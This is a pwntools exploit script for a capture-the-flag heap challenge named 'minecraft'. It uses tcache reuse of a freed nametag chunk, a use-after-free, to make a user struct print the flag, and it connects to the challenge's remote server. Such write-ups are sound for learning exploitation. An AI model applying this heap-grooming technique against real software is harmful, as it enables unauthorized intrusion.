#!/usr/bin/env python3

from pwn import *

exe = ELF("./minecraft")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
#context.log_level = 'debug'

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            context.log_level = 'debug'
    else:
        r = remote("minecraft.chal.cyberjousting.com", 1354)

    return r

def allocate_nametag(r: remote):
    r.sendlineafter(b'6. Leave\n', b'3')
    
    while (not r.recvline().endswith(b'Please input your first and last name:\n')):  # keeping looping till we allocate it
        r.sendlineafter(b'6. Leave\n', b'3')
        
    first_name = b'A' * 7  # 8th byte will be a newline 
    last_name = p64(0x1337)
    r.sendline(first_name)
    r.sendline(last_name)


def free_nametag(r: remote):
    r.sendlineafter(b'6. Leave\n', b'3')
    assert(r.recvline().startswith(b'You have received'))  

def register(r: remote):
    r.sendline(b'1')
    r.sendlineafter(b'now: \n', b'AAAA') # username - doesn't matter
    

def main():
    r = conn()
    
    # good luck pwning :)
    
    # Heap grooming
    
    # 3 (allocate nametag on the heap) with nametag->last = 0x1337 -> 3 (free nametag chunk) WITHOUT ALLOCATING! -> now nametag is placed in the tcache -> 1 (reusing the nametag chunk from the tcache for user struct cuz of same size class) -> 7 
    
    r.sendlineafter(b'now:', b'AAAA')  # username - doesn't matter
    
    allocate_nametag(r)
    free_nametag(r)  # gets put in tcache
    
    register(r)  # malloc returns a pointer to the nametag chunk and poppes it from tcache
    r.sendline('7')  # print flag

    r.interactive()


if __name__ == "__main__":
    main()
